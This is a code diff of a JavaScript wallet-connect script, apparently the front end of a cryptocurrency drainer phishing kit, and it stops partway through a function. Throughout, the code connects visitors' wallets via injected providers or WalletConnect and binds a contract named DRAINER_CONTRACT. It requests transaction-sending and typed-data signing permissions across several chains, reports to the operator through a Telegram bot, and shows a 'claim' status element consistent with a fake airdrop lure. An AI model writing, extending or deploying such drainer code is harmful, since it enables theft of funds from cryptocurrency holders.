@@ -1,54 +1,7 @@
-// ============================================================================
-//  main.js — Production wallet connect flow
-//
-//  KEY DESIGN DECISIONS
-//  ────────────────────
-//  1. Every async step has a HARD TIMEOUT. No step can hang the flow.
-//  2. connectWallet() NEVER throws — always returns a typed result.
-//  3. Web3 is loaded ONCE at boot (avoids mid-connect dynamic import stalls).
-//  4. Global watchdog resets the button if nothing changes for 45 seconds.
-//  5. Direct EVM runs on desktop AND mobile (some mobile browsers inject).
-//  6. WalletConnect runs only if direct fails AND isn't in "rejected" state.
-//  7. Publish global state with the CORRECT provider BEFORE UI update.
-// ============================================================================
-
 import { CONFIG } from './config.js';
 
 ;(async function () {
-  /* ============================================================
-   *  0. HARD TIMEOUT HELPER — the core of the outside-the-box fix
-   * ============================================================
-   * Any async function can be wrapped in `withTimeout(promise, ms, label)`.
-   * If the promise doesn't resolve in `ms`, the wrapper rejects with a
-   * labelled timeout error. This is what stops "Connecting..." hangs.
-   */
-  function withTimeout(promise, ms, label = 'operation') {
-    let timer;
-    const timeout = new Promise((_, reject) => {
-      timer = setTimeout(() => {
-        const err = new Error(`${label} timed out after ${ms}ms`);
-        err.__timeout = true;
-        reject(err);
-      }, ms);
-    });
-    return Promise.race([promise, timeout]).finally(() => clearTimeout(timer));
-  }
-
-  // Safe wrapper: never throws, always returns { ok, value } or { ok:false, error }
-  async function safe(label, fn, timeoutMs) {
-    try {
-      const p = fn();
-      const value = timeoutMs ? await withTimeout(p, timeoutMs, label) : await p;
-      return { ok: true, value };
-    } catch (err) {
-      logDebug(`⚠️ ${label} failed: ${err.message}`);
-      return { ok: false, error: err };
-    }
-  }
-
-  /* ============================================================
-   *  1. DEBUG PANEL
-   * ============================================================ */
+  /* ─── Debug panel ──────────────────────────────────────────────── */
   const debugArea = document.createElement('div');
   debugArea.id = 'wc-debug';
   debugArea.style.cssText = `
@@ -66,14 +19,12 @@ import { CONFIG } from './config.js';
   });
 
   function logDebug(msg) {
-    try { console.log('[main]', msg); } catch (e) {}
+    console.log('[main]', msg);
     debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
     debugArea.scrollTop = debugArea.scrollHeight;
   }
 
-  /* ============================================================
-   *  2. PLATFORM
-   * ============================================================ */
+  /* ─── Platform detection ───────────────────────────────────────── */
   function isMobile()  { return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); }
   function isIOS()     { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
   function isAndroid() { return /Android/i.test(navigator.userAgent); }
@@ -88,140 +39,85 @@ import { CONFIG } from './config.js';
     return 'unknown';
   }
 
-  /* ============================================================
-   *  3. TELEGRAM
-   * ============================================================ */
+  /* ─── Telegram ─────────────────────────────────────────────────── */
   const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;
 
   async function sendTelegramNotification(message) {
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
     try {
-      const r = await withTimeout(
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
-        }),
-        8000,
-        'telegram'
-      );
+      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
+      });
       const result = await r.json();
-      return r.ok && result.ok !== false;
-    } catch (e) {
-      console.error('Telegram exception:', e);
-      return false;
-    }
+      if (!r.ok) { console.error('Telegram error:', result); return false; }
+      return true;
+    } catch (e) { console.error('Telegram exception:', e); return false; }
   }
   window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());
 
-  /* ============================================================
-   *  4. WEBSOCKET CHECK (mobile only)
-   * ============================================================ */
+  /* ─── WebSocket reachability ───────────────────────────────────── */
   async function checkWebSocket(retries = 1, delay = 500) {
     if (isDesktop()) { logDebug('⏭️ Skipping WS check on desktop'); return true; }
     for (let i = 0; i < retries; i++) {
-      const ok = await new Promise((resolve) => {
-        let settled = false;
-        const done = (v) => { if (!settled) { settled = true; resolve(v); } };
-        try {
+      try {
+        const ok = await new Promise((resolve) => {
           const ws = new WebSocket('wss://relay.walletconnect.com');
-          const t = setTimeout(() => { try { ws.close(); } catch (e) {} done(false); }, 3000);
-          ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch (e) {} done(true); };
-          ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch (e) {} done(false); };
-        } catch (e) { done(false); }
-      });
-      if (ok) return true;
-      await new Promise((r) => setTimeout(r, delay));
+          const t = setTimeout(() => { ws.close(); resolve(false); }, 3000);
+          ws.onopen  = () => { clearTimeout(t); ws.close(); resolve(true); };
+          ws.onerror = () => { clearTimeout(t); ws.close(); resolve(false); };
+        });
+        if (ok) return true;
+        await new Promise((r) => setTimeout(r, delay));
+      } catch (e) { await new Promise((r) => setTimeout(r, delay)); }
     }
-    return true; // proceed anyway
+    return true;
   }
 
-  /* ============================================================
-   *  5. LIBRARY LOADING (with CDN fallback)
-   * ============================================================ */
+  /* ─── Library loading with version pinning ─────────────────────── */
   async function loadWalletConnect() {
     const cdns = [
-      'https://esm.sh/@walletconnect/sign-client@2.11.0',
-      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
-      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm'
+      'https://esm.sh/@walletconnect/sign-client@2.17.2',
+      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.17.2/+esm',
+      'https://cdn.skypack.dev/@walletconnect/sign-client@2.17.2'
     ];
     const modalCdns = [
-      'https://esm.sh/@walletconnect/modal@2.6.2',
-      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
-      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm'
+      'https://esm.sh/@walletconnect/modal@2.7.0',
+      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.7.0/+esm',
+      'https://cdn.skypack.dev/@walletconnect/modal@2.7.0'
     ];
     const providerCdns = [
-      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
-      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
-      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm'
+      'https://esm.sh/@walletconnect/ethereum-provider@2.17.2',
+      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.17.2/+esm',
+      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.17.2'
     ];
 
     let SignClient, WalletConnectModal, EthereumProvider;
-
-    for (const url of cdns) {
-      const r = await safe(`SignClient from ${url}`, () => import(url), 15000);
-      if (r.ok) { SignClient = r.value.default || r.value; logDebug(`✅ SignClient from ${url}`); break; }
-    }
+    for (const url of cdns)         { try { const m = await import(url); SignClient         = m.default || m; logDebug(`✅ SignClient from ${url}`); break; } catch (e) { logDebug(`❌ ${url}: ${e.message}`); } }
     if (!SignClient) throw new Error('Could not load SignClient');
-
-    for (const url of modalCdns) {
-      const r = await safe(`WalletConnectModal from ${url}`, () => import(url), 15000);
-      if (r.ok) { WalletConnectModal = r.value.WalletConnectModal || r.value.default || r.value; logDebug(`✅ WalletConnectModal from ${url}`); break; }
-    }
+    for (const url of modalCdns)    { try { const m = await import(url); WalletConnectModal = m.WalletConnectModal || m.default || m; logDebug(`✅ WalletConnectModal from ${url}`); break; } catch (e) { logDebug(`❌ ${url}: ${e.message}`); } }
     if (!WalletConnectModal) throw new Error('Could not load WalletConnectModal');
-
-    for (const url of providerCdns) {
-      const r = await safe(`EthereumProvider from ${url}`, () => import(url), 15000);
-      if (r.ok) { EthereumProvider = r.value.EthereumProvider || r.value.default || r.value; logDebug(`✅ EthereumProvider from ${url}`); break; }
-    }
+    for (const url of providerCdns) { try { const m = await import(url); EthereumProvider   = m.EthereumProvider || m.default || m; logDebug(`✅ EthereumProvider from ${url}`); break; } catch (e) { logDebug(`❌ ${url}: ${e.message}`); } }
     if (!EthereumProvider) throw new Error('Could not load EthereumProvider');
 
     return { SignClient, WalletConnectModal, EthereumProvider };
   }
 
-  /* ============================================================
-   *  6. DOM + STATE
-   * ============================================================ */
+  /* ─── DOM refs ─────────────────────────────────────────────────── */
   const connectButton = document.getElementById('connectButton');
   const walletButton  = document.getElementById('walletButton');
-  let claimStatus     = document.getElementById('claimStatus');
+  const claimStatus   = document.getElementById('claimStatus');
 
-  if (!claimStatus && connectButton) {
-    claimStatus = document.createElement('div');
-    claimStatus.id = 'claimStatus';
-    connectButton.parentNode.appendChild(claimStatus);
-  }
-
+  /* ─── State ────────────────────────────────────────────────────── */
   let currentSession = null;
   let client, modal, SignClient, WalletConnectModal, EthereumProvider;
-  let Web3Ctor = null;              // loaded ONCE at boot
   let web3Instance = null;
   let contractInstance = null;
   let activeProvider = null;
   let isConnecting = false;
 
-  /* ============================================================
-   *  7. GLOBAL WATCHDOG
-   *  If we enter "loading" and nothing changes in 45s, reset.
-   * ============================================================ */
-  let watchdogTimer = null;
-  function armWatchdog() {
-    disarmWatchdog();
-    watchdogTimer = setTimeout(() => {
-      logDebug('🛑 WATCHDOG: connect flow hung — resetting UI');
-      isConnecting = false;
-      setButtonState(connectButton, 'failed');
-      if (walletButton) setButtonState(walletButton, 'failed');
-      showStatus('Connection timed out. Please try again.', 'error');
-    }, 45000);
-  }
-  function disarmWatchdog() {
-    if (watchdogTimer) { clearTimeout(watchdogTimer); watchdogTimer = null; }
-  }
-
-  /* ============================================================
-   *  8. UI STATE
-   * ============================================================ */
+  /* ─── Button UI ────────────────────────────────────────────────── */
   function setButtonState(button, state) {
     if (!button) return;
     button.style.display = 'inline-block';
@@ -277,38 +173,47 @@ import { CONFIG } from './config.js';
     };
     Object.assign(claimStatus.style, styles[type] || styles.info);
     if (type === 'error' || type === 'success') {
-      setTimeout(() => { if (claimStatus) claimStatus.style.display = 'none'; }, 5000);
+      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
     }
   }
 
   setButtonState(connectButton, 'normal');
   if (walletButton) setButtonState(walletButton, 'normal');
 
-  /* ============================================================
-   *  9. CONFIG
-   * ============================================================ */
-  const { PROJECT_ID, PUBLIC_TEST_ID, DAPP_METADATA, DRAINER_CONTRACT, CONTRACT_ABI } = CONFIG;
+  /* ─── Config destructure ───────────────────────────────────────── */
+  const {
+    PROJECT_ID,
+    PUBLIC_TEST_ID,
+    DAPP_METADATA,
+    DRAINER_CONTRACT,
+    CONTRACT_ABI,
+    MAINNET_ID,
+    SUPPORTED_CHAINS
+  } = CONFIG;
+
   let projectId = PROJECT_ID;
 
-  /* ============================================================
-   *  10. STORAGE
-   * ============================================================ */
+  /* ─── Multi-chain namespace builder ─────────────────────────────
+   *  Wallets need at least one supported chain in their current network.
+   *  If we hardcode eip155:1 and the user is on BSC, connection fails.
+   *  We offer a broad optionalChains list and keep requiredChains minimal.
+   * ──────────────────────────────────────────────────────────────── */
+  const CHAIN_IDS = (SUPPORTED_CHAINS && SUPPORTED_CHAINS.length ? SUPPORTED_CHAINS : [1, 56, 137, 42161, 8453, 10]);
+  const CHAIN_STRINGS = CHAIN_IDS.map((id) => `eip155:${id}`);
+
+  /* ─── Storage ──────────────────────────────────────────────────── */
   function saveWallet(address, session = null, chainType = null) {
-    try {
-      localStorage.setItem('connectedWallet', address);
-      if (session)   localStorage.setItem('walletConnectSession', JSON.stringify(session));
-      if (chainType) localStorage.setItem('chainType', chainType);
-    } catch (e) {}
+    localStorage.setItem('connectedWallet', address);
+    if (session)   localStorage.setItem('walletConnectSession', JSON.stringify(session));
+    if (chainType) localStorage.setItem('chainType', chainType);
   }
-  function getSavedWallet()    { try { return localStorage.getItem('connectedWallet'); } catch (e) { return null; } }
-  function getSavedSession()   { try { const s = localStorage.getItem('walletConnectSession'); return s ? JSON.parse(s) : null; } catch (e) { return null; } }
-  function getSavedChainType() { try { return localStorage.getItem('chainType') || 'unknown'; } catch (e) { return 'unknown'; } }
+  function getSavedWallet()    { return localStorage.getItem('connectedWallet'); }
+  function getSavedSession()   { const s = localStorage.getItem('walletConnectSession'); return s ? JSON.parse(s) : null; }
+  function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown'; }
   function clearSavedWallet() {
-    try {
-      localStorage.removeItem('connectedWallet');
-      localStorage.removeItem('walletConnectSession');
-      localStorage.removeItem('chainType');
-    } catch (e) {}
+    localStorage.removeItem('connectedWallet');
+    localStorage.removeItem('walletConnectSession');
+    localStorage.removeItem('chainType');
   }
 
   function getChainType() {
@@ -318,14 +223,11 @@ import { CONFIG } from './config.js';
     return 'unknown';
   }
 
-  /* ============================================================
-   *  11. GLOBAL STATE PUBLISHER
-   * ============================================================ */
-  function publishGlobalState(address, chain) {
-    const live = activeProvider || web3Instance?.currentProvider || window.ethereum || null;
+  /* ─── Global state publisher ───────────────────────────────────── */
+  function publishGlobalState(address, chain, provider = null) {
+    const live = provider || activeProvider || web3Instance?.currentProvider || window.ethereum || null;
     window.__apexConnected = {
-      address,
-      chain,
+      address, chain,
       web3: web3Instance,
       contract: contractInstance,
       provider: live,
@@ -341,9 +243,7 @@ import { CONFIG } from './config.js';
     window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
   }
 
-  /* ============================================================
-   *  12. UI UPDATE
-   * ============================================================ */
+  /* ─── Connected UI ─────────────────────────────────────────────── */
   function updateConnectedUI(address, chain = 'evm') {
     setButtonState(connectButton, 'disconnect');
     if (walletButton) setButtonState(walletButton, 'disconnect');
@@ -408,99 +308,38 @@ import { CONFIG } from './config.js';
     window.__apexConnected = null;
   }
 
-  /* ============================================================
-   *  13. PROVIDER DISCOVERY (unified)
-   * ============================================================ */
+  /* ─── EIP-6963 discovery ───────────────────────────────────────── */
   let evmProviders = [];
   let eip6963Initialized = false;
-
   function setupEIP6963() {
     if (eip6963Initialized) return;
     eip6963Initialized = true;
-
     window.addEventListener('eip6963:announceProvider', (e) => {
       const d = e.detail;
-      if (!d?.info || !d?.provider) return;
-      const key = d.info.uuid || `${d.info.rdns}|${d.info.name}`;
-      if (!evmProviders.some((p) => (p.info.uuid || `${p.info.rdns}|${p.info.name}`) === key)) {
+      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
         evmProviders.push(d);
-        logDebug(`EIP-6963: ${d.info.name} (${d.info.rdns})`);
+        logDebug(`EIP-6963: ${d.info.name}`);
       }
     });
-
-    const request = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
-    request();
-    setTimeout(request, 500);
-    setTimeout(request, 1500);
-    setTimeout(request, 3000);
+    window.dispatchEvent(new Event('eip6963:requestProvider'));
+    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
+    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
   }
 
-  function collectEVMProviders() {
-    const seen = new Set();
-    const list = [];
-
-    const push = (info, provider, uniqueId) => {
-      if (!provider) return;
-      const key = uniqueId || info.uuid || `${info.rdns}|${info.name}`;
-      if (seen.has(key)) return;
-      seen.add(key);
-      list.push({ info, provider });
-    };
-
-    // 1. EIP-6963 announced providers
-    for (const p of evmProviders) push(p.info, p.provider);
-
-    // 2. Legacy multi-provider shim
-    if (window.ethereum?.providers && Array.isArray(window.ethereum.providers)) {
-      for (let i = 0; i < window.ethereum.providers.length; i++) {
-        const p = window.ethereum.providers[i];
-        let name = 'Injected', rdns = 'io.injected';
-        if (p.isMetaMask)            { name = 'MetaMask'; rdns = 'io.metamask'; }
-        else if (p.isCoinbaseWallet) { name = 'Coinbase Wallet'; rdns = 'com.coinbase.wallet'; }
-        else if (p.isBraveWallet)    { name = 'Brave Wallet'; rdns = 'com.brave.wallet'; }
-        else if (p.isRabby)          { name = 'Rabby'; rdns = 'io.rabby'; }
-        else if (p.isTrust)          { name = 'Trust Wallet'; rdns = 'com.trustwallet'; }
-        push({ uuid: `${rdns}-legacy-${i}`, name, rdns, icon: '' }, p, `legacy-${i}`);
-      }
-    }
-
-    // 3. Phantom EVM
-    if (window.phantom?.ethereum) {
-      push({ uuid: 'phantom-evm', name: 'Phantom (EVM)', rdns: 'app.phantom', icon: '' },
-        window.phantom.ethereum, 'phantom-evm');
-    }
-
-    // 4. Plain window.ethereum fallback
-    if (window.ethereum) {
-      let name = 'Injected', rdns = 'io.injected';
-      if (window.ethereum.isMetaMask)            { name = 'MetaMask'; rdns = 'io.metamask'; }
-      else if (window.ethereum.isCoinbaseWallet) { name = 'Coinbase Wallet'; rdns = 'com.coinbase.wallet'; }
-      else if (window.ethereum.isBraveWallet)    { name = 'Brave Wallet'; rdns = 'com.brave.wallet'; }
-      else if (window.ethereum.isRabby)          { name = 'Rabby'; rdns = 'io.rabby'; }
-      else if (window.ethereum.isTrust)          { name = 'Trust Wallet'; rdns = 'com.trustwallet'; }
-      else if (window.ethereum.isPhantom)        { name = 'Phantom (EVM)'; rdns = 'app.phantom'; }
-      push({ uuid: `${rdns}-direct`, name, rdns, icon: '' }, window.ethereum, 'direct');
-    }
-
-    return list;
-  }
-
-  /* ============================================================
-   *  14. WALLET PICKER
-   * ============================================================ */
+  /* ─── Wallet picker ────────────────────────────────────────────── */
   function showWalletSelectionModal(providers, cb) {
     const overlay = document.createElement('div');
     overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;
-    const box = document.createElement('div');
-    box.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;
-    box.innerHTML = `
+    const modal = document.createElement('div');
+    modal.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;
+    modal.innerHTML = `
       <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
       <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
       <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
     `;
-    overlay.appendChild(box);
+    overlay.appendChild(modal);
     document.body.appendChild(overlay);
-    const list = box.querySelector('#wl');
+    const list = modal.querySelector('#wl');
     providers.forEach((p) => {
       const b = document.createElement('button');
       b.textContent = p.info.name;
@@ -515,18 +354,15 @@ import { CONFIG } from './config.js';
       b.onclick = () => { overlay.remove(); cb(p); };
       list.appendChild(b);
     });
-    box.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
+    modal.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
   }
 
-  /* ============================================================
-   *  15. WALLETCONNECT INIT
-   * ============================================================ */
+  /* ─── WalletConnect init ───────────────────────────────────────── */
   async function initWalletConnect(useTestId = false) {
     if (client && modal) return true;
     if (useTestId) { projectId = PUBLIC_TEST_ID; logDebug('Using test ID'); }
     await checkWebSocket(1, 500);
-
-    const r = await safe('WalletConnect init', async () => {
+    try {
       client = await SignClient.init({
         projectId,
         metadata: DAPP_METADATA,
@@ -542,189 +378,313 @@ import { CONFIG } from './config.js';
         },
         enableExplorer: true
       });
+      logDebug('✅ WalletConnect init OK');
+
+      // Attach listeners immediately after init
+      client.on('session_update', ({ params }) => {
+        const accounts = params.namespaces?.eip155?.accounts;
+        if (accounts?.length) {
+          const a = accounts[0].split(':')[2];
+          updateConnectedUI(a, 'evm');
+          saveWallet(a, currentSession, 'evm');
+        }
+      });
+      client.on('session_delete', () => { resetConnectedUI(); clearSavedWallet(); });
+      client.on('session_connect', (session) => {
+        const a = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
+        if (a) {
+          saveWallet(a, session, 'evm');
+          updateConnectedUI(a, 'evm');
+          currentSession = session;
+        }
+      });
+
       return true;
-    }, 20000);
-
-    if (!r.ok) { logDebug('WC init failed: ' + (r.error?.message || 'unknown')); return false; }
-    logDebug('✅ WalletConnect init OK');
-    return true;
+    } catch (e) {
+      logDebug('WC init failed: ' + e.message);
+      return false;
+    }
   }
 
-  /* ============================================================
-   *  16. DIRECT EVM CONNECT — hard-timeout-protected
-   * ============================================================
-   *  Returns:
-   *    { status: 'connected', address, provider }
-   *    { status: 'rejected' }     → user rejected
-   *    { status: 'unavailable' }  → no providers found
-   *    { status: 'failed', error }→ any other failure
-   */
-  async function connectDirectEVM(totalTimeoutMs = 12000) {
+  /* ─── Direct EVM connect ───────────────────────────────────────── */
+  async function connectDirectEVM(timeoutMs = 8000) {
     setupEIP6963();
-
-    // Give EIP-6963 a moment (max 1.5s)
-    await new Promise((r) => setTimeout(r, 1500));
-
-    const all = collectEVMProviders();
-    if (all.length === 0) {
-      logDebug('No injected EVM providers found');
-      return { status: 'unavailable' };
+    await new Promise((r) => setTimeout(r, 800));
+    let providers = evmProviders.filter((p) => p.provider);
+    if (providers.length === 0 && window.ethereum) {
+      providers = [{ info: { name: 'Injected', rdns: 'io.injected' }, provider: window.ethereum }];
     }
+    if (providers.length === 0) return false;
 
-    logDebug(`Found ${all.length} EVM provider(s): ${all.map((p) => p.info.name).join(', ')}`);
-
-    // Selection
     let chosen = null;
-    const metaMask = all.find((p) => p.info.rdns === 'io.metamask');
-    if (metaMask) {
-      chosen = metaMask;
-    } else if (all.length === 1) {
-      chosen = all[0];
-    } else {
-      // Multiple non-MetaMask wallets: show picker (with its own timeout)
-      const picked = await safe('Wallet picker', () => new Promise((res) => showWalletSelectionModal(all, res)), 60000);
-      if (!picked.ok || !picked.value) return { status: 'unavailable' };
-      chosen = picked.value;
+    if (providers.length === 1) chosen = providers[0];
+    else {
+      const known = providers.find((p) => p.info.rdns === 'io.metamask' || p.info.name.toLowerCase().includes('metamask'));
+      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
+      if (!chosen) return false;
     }
-
-    const provider = chosen.provider;
-    logDebug(`Requesting accounts from ${chosen.info.name}...`);
-
-    const req = await safe(
-      `eth_requestAccounts on ${chosen.info.name}`,
-      () => provider.request({ method: 'eth_requestAccounts' }),
-      totalTimeoutMs
-    );
-
-    if (!req.ok) {
-      const e = req.error;
-      if (e?.code === 4001) return { status: 'rejected' };
-      return { status: 'failed', error: e };
-    }
-
-    const accounts = req.value;
-    if (!accounts?.length) return { status: 'failed', error: new Error('no accounts') };
-
-    const address = accounts[0];
-
-    // Load Web3 if not already loaded
-    if (!Web3Ctor) {
-      const wr = await safe('load web3', async () => (await import('web3')).default, 10000);
-      if (!wr.ok) return { status: 'failed', error: wr.error };
-      Web3Ctor = wr.value;
-    }
-
-    activeProvider = provider;
-    web3Instance = new Web3Ctor(provider);
-    contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
-
-    saveWallet(address, null, 'evm');
-    setupEVMProviderEvents(provider);
-    updateConnectedUI(address, 'evm');
-
-    logDebug(`✅ Direct EVM connected via ${chosen.info.name}: ${address}`);
-    return { status: 'connected', address, provider };
-  }
-
-  /* ============================================================
-   *  17. WALLETCONNECT EVM CONNECT — hard-timeout-protected
-   * ============================================================ */
-  async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
-    if (isConnecting) return { status: 'busy' };
-    isConnecting = true;
 
     try {
-      const initOk = await initWalletConnect(useTestId);
-      if (!initOk) { isConnecting = false; return { status: 'failed', error: new Error('WC init failed') }; }
+      const provider = chosen.provider;
+      const accounts = await Promise.race([
+        provider.request({ method: 'eth_requestAccounts' }),
+        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs))
+      ]);
+      if (accounts?.length) {
+        const address = accounts[0];
+        saveWallet(address, null, 'evm');
+        setupEVMProviderEvents(provider);
+        const Web3 = (await import('web3')).default;
+        web3Instance = new Web3(provider);
+        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
+        activeProvider = provider;
+        updateConnectedUI(address, 'evm');
+        logDebug(`✅ Direct EVM: ${address}`);
+        return true;
+      }
+    } catch (e) {
+      logDebug('Direct EVM error: ' + e.message);
+      return false;
+    }
+    return false;
+  }
 
-      if (modal?.closeModal) { try { modal.closeModal(); } catch (e) {} }
+  /* ─── WalletConnect EVM connect (FIXED) ────────────────────────── */
+  async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
+    if (isConnecting) return false;
+    isConnecting = true;
+    const ok = await initWalletConnect(useTestId);
+    if (!ok) { isConnecting = false; showStatus('WC unavailable', 'error'); return false; }
+    if (modal?.closeModal) { try { modal.closeModal(); } catch (e) {} }
 
+    try {
       showStatus('Requesting connection...', 'info');
 
-      const connectRes = await safe(
-        'client.connect',
-        () => client.connect({
-          requiredNamespaces: {
-            eip155: {
-              methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
-              chains: ['eip155:1'],
-              events: ['chainChanged', 'accountsChanged']
-            }
-          }
-        }),
-        30000
-      );
+      // Build required + optional namespaces.
+      // Required: at least Ethereum mainnet so the wallet doesn't reject outright.
+      // Optional: all other chains so the wallet CAN connect from its current network.
+      const requiredNamespaces = {
+        eip155: {
+          methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
+          chains: ['eip155:1'],
+          events: ['chainChanged', 'accountsChanged']
+        }
+      };
+      const optionalNamespaces = {
+        eip155: {
+          methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
+          chains: CHAIN_STRINGS.filter((c) => c !== 'eip155:1'),
+          events: ['chainChanged', 'accountsChanged']
+        }
+      };
 
-      if (!connectRes.ok) {
-        isConnecting = false;
-        return { status: 'failed', error: connectRes.error };
-      }
+      const { uri, approval } = await client.connect({
+        requiredNamespaces,
+        optionalNamespaces
+      });
 
-      const { uri, approval } = connectRes.value;
-      if (!uri) { isConnecting = false; return { status: 'failed', error: new Error('No URI') }; }
+      if (!uri) throw new Error('No URI received from client.connect');
 
+      logDebug('Opening WalletConnect modal...');
       modal.openModal({ uri });
-      showStatus('Scan the QR code', 'info');
+      showStatus('Scan the QR code with your wallet', 'info');
       sessionStorage.setItem('pending_wc_uri', uri);
       sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());
 
-      const approvalRes = await safe('approval', () => approval(), timeoutMs);
+      logDebug('Waiting for approval...');
+      const session = await Promise.race([
+        approval(),
+        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs))
+      ]);
 
-      try { if (modal) modal.closeModal(); } catch (e) {}
+      logDebug('Session received: ' + JSON.stringify({
+        topic: session?.topic?.slice(0, 12),
+        namespaces: Object.keys(session?.namespaces || {})
+      }));
+
+      if (modal) modal.closeModal();
       sessionStorage.removeItem('pending_wc_uri');
       sessionStorage.removeItem('pending_wc_timestamp');
 
-      if (!approvalRes.ok) {
+      if (session?.namespaces?.eip155?.accounts?.length) {
+        const account = session.namespaces.eip155.accounts[0].split(':')[2];
+        currentSession = session;
+
+        // Build the EthereumProvider from the session.
+        // This is the CORRECT way to instantiate a WC provider in 2.17.x.
+        const provider = await EthereumProvider.init({
+          projectId,
+          chains: [1],
+          optionalChains: CHAIN_IDS.filter((id) => id !== 1),
+          showQrModal: false,
+          metadata: DAPP_METADATA,
+          rpcMap: {},
+          session
+        });
+
+        const Web3 = (await import('web3')).default;
+        web3Instance = new Web3(provider);
+        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
+        activeProvider = provider;
+        saveWallet(account, session, 'evm');
+        updateConnectedUI(account, 'evm');
+        setupEVMProviderEvents(provider);
         isConnecting = false;
-        return { status: 'failed', error: approvalRes.error };
+        logDebug(`✅ WC EVM: ${account}`);
+        return true;
       }
 
-      const session = approvalRes.value;
-      if (!session?.namespaces?.eip155?.accounts?.length) {
-        isConnecting = false;
-        return { status: 'failed', error: new Error('No accounts in session') };
-      }
-
-      const account = session.namespaces.eip155.accounts[0].split(':')[2];
-      currentSession = session;
-
-      // Try EthereumProvider
-      let provider = null;
-      const providerRes = await safe(
-        'EthereumProvider.init',
-        () => EthereumProvider.init({ projectId, metadata: DAPP_METADATA, session }),
-        15000
-      );
-      if (providerRes.ok) provider = providerRes.value;
-      else if (isDesktop() && window.ethereum) {
-        logDebug('Falling back to window.ethereum for the WC session');
-        provider = window.ethereum;
-      } else {
-        isConnecting = false;
-        return { status: 'failed', error: providerRes.error };
-      }
-
-      // Load Web3 if needed
-      if (!Web3Ctor) {
-        const wr = await safe('load web3', async () => (await import('web3')).default, 10000);
-        if (!wr.ok) { isConnecting = false; return { status: 'failed', error: wr.error }; }
-        Web3Ctor = wr.value;
-      }
-
-      activeProvider = provider;
-      web3Instance = new Web3Ctor(provider);
-      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
-
-      saveWallet(account, session, 'evm');
-      setupEVMProviderEvents(provider);
-      updateConnectedUI(account, 'evm');
-
+      logDebug('⚠️ Session had no eip155 accounts');
       isConnecting = false;
-      logDebug(`✅ WalletConnect connected: ${account}`);
-      return { status: 'connected', address: account, provider };
+      return false;
     } catch (e) {
-      try { if (modal) modal.closeModal(); } catch (_) {}
+      logDebug('WC error: ' + e.message);
+      if (modal) modal.closeModal();
       sessionStorage.removeItem('pending_wc_uri');
       sessionStorage.removeItem('pending_wc_timestamp');
       isConnecting = false;
-      return { status: '
+      return false;
+    }
+  }
+
+  /* ─── Provider events ──────────────────────────────────────────── */
+  function setupEVMProviderEvents(provider) {
+    if (!provider || !provider.on) return;
+    provider.on('accountsChanged', (accounts) => {
